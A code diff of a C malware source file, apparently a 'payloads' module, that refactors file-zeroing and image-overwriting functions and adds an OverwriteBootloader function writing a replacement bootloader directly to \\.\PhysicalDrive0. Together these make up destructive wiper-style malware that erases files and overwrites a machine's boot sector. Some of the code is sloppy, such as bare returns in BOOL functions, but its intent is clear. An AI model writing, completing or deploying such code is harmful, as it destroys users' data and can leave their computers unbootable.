@@ -1,14 +1,7 @@
 #include "payloads.h"
 
-BOOL ZeroOutFile(char* filename) {
-    HANDLE file = CreateFileW(filename, 
-        GENERIC_READ | GENERIC_WRITE,
-        FILE_SHARE_READ, 
-        NULL, 
-        OPEN_EXISTING, 
-        FILE_ATTRIBUTE_NORMAL, 
-        NULL
-    );
+BOOL ZeroOutFile(LPCWSTR filename) {
+    HANDLE file = CreateFileW(filename, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (file == INVALID_HANDLE_VALUE) {
         return;
@@ -32,9 +25,9 @@ BOOL ZeroOutFile(char* filename) {
     return CloseHandle(file);
 }
 
-BOOL ReplaceImage(char* filename) {
-    HANDLE source = CreateFileW(IMAGE_PATH, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    HANDLE destination = CreateFileW(filename, GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+BOOL ReplaceImage(LPCWSTR filename) {
+    HANDLE source = CreateFileW((LPCWSTR)IMAGE_PATH, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE destination = CreateFileW(filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (source == INVALID_HANDLE_VALUE || destination == INVALID_HANDLE_VALUE) {
         return;
@@ -56,3 +49,29 @@ BOOL ReplaceImage(char* filename) {
         return TRUE;
     }
 }
+
+BOOL OverwriteBootloader() {
+    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE bootloader = CreateFileW((LPCWSTR)BOOTLOADER_PATH, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+    if (drive == INVALID_HANDLE_VALUE || bootloader == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    DWORD size = GetFileSize(bootloader, NULL);
+    char buffer[size];
+
+    if (!ReadFile(bootloader, buffer, size, NULL, NULL)) {
+        return FALSE;
+    }
+    if (!WriteFile(drive, buffer, size, NULL, NULL)) {
+        return FALSE;
+    }
+
+    if (!CloseHandle(drive) || !CloseHandle(bootloader)) {
+        return FALSE;
+    } else {
+        return TRUE;
+    }
+}
+
